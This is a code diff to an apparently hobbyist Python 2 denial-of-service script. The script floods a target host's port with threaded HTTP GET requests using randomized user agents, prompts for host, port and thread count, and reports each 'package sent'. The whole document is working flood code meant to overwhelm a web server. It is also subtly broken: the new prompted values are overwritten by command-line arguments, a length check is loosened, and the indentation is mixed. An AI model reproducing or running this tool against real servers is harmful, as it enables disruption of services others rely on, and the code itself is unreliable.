@@ -9,6 +9,14 @@ print ("\033[31m _\ \/ _ \/ __/  '_/ -_) __/ // / // / _ \_\ \   \033[0m")
 print ("\033[31m/___/\___/\__/_/\_\\__/\__/____/____/\___/___/   \033[0m")
 print ("\033[33m                     Instagram : @bossy.078 \033[0m")                                               
 
+print (" ")
+ip = raw_input("\033[93m [+] Host / IP : \033[1m")
+port = input("\033[94m [+] Port : \033[1m")
+thread_num = input("\033[95m [+] Threads : \033[1m")
+print (" ")
+print "\033[91m [!] Please Wait While Packages Are Preparing Thread : \033[1m",thread_num
+time.sleep(5)
+
 url = sys.argv[1]
 port = (80)
 thread_num = int(sys.argv[2])
@@ -38,26 +46,26 @@ useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)
             "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]
 
 def run():
-	if len(sys.argv)>=3:
+	if len(sys.argv)>=1:
 		get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + url + "\r\n"
 		acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
 		connection = "Connection: Keep-Alive\r\n"
 		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 		accept = random.choice(acceptall)
 		request = get_host + useragent + accept + connection + "\r\n"
-                print "\033[92m [+] Package Sent ! \033[0m" + str(url) +" Threads:"+str(thread_num)
         while True:
 			try:
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 				s.connect((str(url), int(port)))
 				s.send (str.encode(request))
+				print "\033[92m [+] Package Sent ! \033[0m"
 			except:
 				s.close()
 				print "\033[91m [!] Error , Socket Closed \033[0m"
 
 
 	else:
-		print "It only work on HTTP server!!!"
+		print "\033[91m [!] It Only Work On HTTP Server ! \033[0m"
 
 for i in range(thread_num):
     th = threading.Thread(target = run)
